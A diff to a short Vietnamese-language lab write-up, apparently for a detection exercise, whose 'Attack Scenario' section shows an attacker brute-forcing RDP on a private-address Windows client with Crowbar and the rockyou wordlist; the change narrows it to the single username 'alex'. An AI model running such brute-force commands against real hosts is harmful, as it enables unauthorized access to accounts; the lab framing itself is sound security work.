@@ -6,10 +6,12 @@
 
 ## 1. Attack Scenario
 
-Attacker sử dụng Crowbar brute force dịch vụ RDP trên 1 host dưới đây là windows client. Với 1 list common username và list password , sử dựng 1 thread.
+Attacker sử dụng Crowbar brute force dịch vụ RDP trên 1 host dưới đây là windows client. Với username là alex và list password , sử dựng 1 thread.
+
+**Trong đây giả sử attacker đã thu được username**
 
 ```bash
-sudo crowbar -b rdp -s 192.168.188.40/32 -U username.txt -C /usr/share/wordlists/rockyou.txt -n 1
+sudo crowbar -b rdp -s 192.168.188.40/32 -u alex -C /usr/share/wordlists/rockyou.txt -n 1
 ```
 
 <img width="1602" height="289" alt="image" src="https://github.com/user-attachments/assets/cc284351-0723-476c-9f2c-6f36573abf19" />
